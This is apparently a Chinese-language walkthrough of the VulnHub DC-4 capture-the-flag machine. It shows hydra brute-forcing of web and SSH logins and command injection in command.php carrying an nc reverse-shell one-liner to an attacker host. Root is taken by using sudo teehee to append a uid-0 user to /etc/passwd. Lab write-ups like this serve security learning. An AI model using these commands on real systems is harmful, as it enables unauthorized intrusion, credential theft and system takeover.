# DC: 4

2024-5-28 https://www.vulnhub.com/entry/dc-4,313/

difficulty: beginners/intermediates

## IP

192.168.5.29

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey:
|   2048 8d6057066c27e02f762ce642c001ba25 (RSA)
|   256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)
|_  256 fd39478a5e58339973739e227f904f4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
```

http://192.168.5.29/ 首页是一个登陆页面，可能存在 sql 注入，先用 gobuster 扫描看看还有什么其他目录。

```
http://192.168.5.29/index.php            (Status: 200) [Size: 506]
http://192.168.5.29/images               (Status: 301) [Size: 170] [--> http://192.168.5.29/images/]
http://192.168.5.29/login.php            (Status: 302) [Size: 206] [--> index.php]
http://192.168.5.29/css                  (Status: 301) [Size: 170] [--> http://192.168.5.29/css/]
http://192.168.5.29/logout.php           (Status: 302) [Size: 163] [--> index.php]
http://192.168.5.29/command.php          (Status: 302) [Size: 704] [--> index.php]
```

都需要登陆后才能访问。

只有先尝试爆破一下登陆的页面了，看看能不能找到可用的用户凭据：

```
hydra -t 20 -l admin -P ~/tools/dict/rockyou.txt 192.168.5.29 -f http-post-form "/login.php:username=^USER^&password=^PASS^:302"

[80][http-post-form] host: 192.168.5.29   login: admin   password: happy
```

找到了 admin 的用户密码 happy, 进入系统后，发现 http://192.168.5.29/command.php 链接，有 3 个按钮，可以调用系统命令。

进行拦截，发现上传的数据包不是固定的：

```
radio=df+-h&submit=Run
```

radio 这里没有固定，可以自行修改：

```
radio=ls+-al&submit=Run
```

可以正常显示 ls -al, 写入反弹 payload，别忘记加 session 的 cookie:

```
curl -b 'PHPSESSID=afn62b979jtv0u4q2bp2nql7g3' --data-urlencode "radio=ls -al" --data-urlencode "submit=Run" http://192.168.5.29/command.php
```

发现目标系统有 /bin/nc ，可以用 nc 进行反弹，kali 上监听 8888 端口：

```
curl -b 'PHPSESSID=afn62b979jtv0u4q2bp2nql7g3' --data-urlencode "radio=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.5.3 8888 >/tmp/f" --data-urlencode "submit=Run" http://192.168.5.29/command.php
```

得到反弹 shell 后，先升级下 tty。

在 /home 目录下有 3 个用户 home 目录文件夹，charles jim sam，其中 jim 文件夹中有一个密码文件：

```
www-data@dc-4:/home/jim$ ls -al backups/
total 12
drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .
drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..
-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak
```

猜测可能这 3 个用户的密码可能存在这里，可以先用 hydra 爆破一波：

```
hydra -t 20 -l user -P pass  ssh://192.168.5.29

[22][ssh] host: 192.168.5.29   login: jim   password: jibril04
```

找到了 jim 的密码 jibril04，ssh 登陆进去。

发现线索：

```
jim@dc-4:~$ cat mbox
From root@dc-4 Sat Apr 06 20:20:04 2019
Return-path: <root@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 20:20:04 +1000
Received: from root by dc-4 with local (Exim 4.89)
	(envelope-from <root@dc-4>)
	id 1hCiQe-0000gc-EC
	for jim@dc-4; Sat, 06 Apr 2019 20:20:04 +1000
To: jim@dc-4
Subject: Test
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCiQe-0000gc-EC@dc-4>
From: root <root@dc-4>
Date: Sat, 06 Apr 2019 20:20:04 +1000
Status: RO

This is a test.
```

像是个邮件，可能 jim 还有其他邮件，看看有没有 cat /var/mail/jim 发现了密码：

```
Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```

su 切换到 charles，输入密码 ^xHhA&hvim0y

发现 sudo :

```
(root) NOPASSWD: /usr/bin/teehee
```

/usr/bin/teehee 与 tee 的使用方法一样，可以追加特定内容到特定文件：

```
echo 'tom:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:User_like_root:/root:/bin/bash' | sudo -u root /usr/bin/teehee -a "/etc/passwd"
```

在 /etc/passwd 中添加一个新用户 tom，密码为 123，su 切换到 tom：

```
charles@dc-4:~$ su tom
Password:
root@dc-4:/home/charles# id
uid=0(root) gid=0(root) groups=0(root)
root@dc-4:/home/charles# cd /root
root@dc-4:~# ls -al
total 28
drwx------  3 root root 4096 Apr  7  2019 .
drwxr-xr-x 21 root root 4096 Apr  5  2019 ..
-rw-------  1 root root   16 Apr  7  2019 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  976 Apr  6  2019 flag.txt
drwxr-xr-x  2 root root 4096 Apr  6  2019 .nano
-rw-r--r--  1 root root  148 Aug 18  2015 .profile
root@dc-4:~# cat flag.txt



888       888          888 888      8888888b.                             888 888 888 888
888   o   888          888 888      888  "Y88b                            888 888 888 888
888  d8b  888          888 888      888    888                            888 888 888 888
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

发现 suid 程序（这里不能提权，没用可以不用看了）：

```
find / -perm -u=s -ls 2>/dev/null

9804 4 -rwsrwxrwx  1 jim  jim   174 Apr  6  2019 /home/jim/test.sh

www-data@dc-4:/usr/share/nginx/html$ ls -al /home/jim/test.sh
-rwsrwxrwx 1 jim jim 174 Apr  6  2019 /home/jim/test.sh
```

可以有修改权限：

```
www-data@dc-4:/usr/share/nginx/html$ cat /home/jim/test.sh
#!/bin/bash
for i in {1..5}
do
 sleep 1
 echo "Learn bash they said."
 sleep 1
 echo "Bash is good they said."
done
 echo "But I'd rather bash my head against a brick wall."
```

发现 sleep 没有使用绝对路径，可以尝试利用进行程序劫持，echo 是内建命令，不能劫持，尝试劫持 sleep：

```
echo '/bin/bash -p' > /tmp/sleep
chmod +x /tmp/sleep
PATH=/tmp:$PATH /home/jim/test.sh
```

但是不行，发现执行后，还是 www-data 权限。
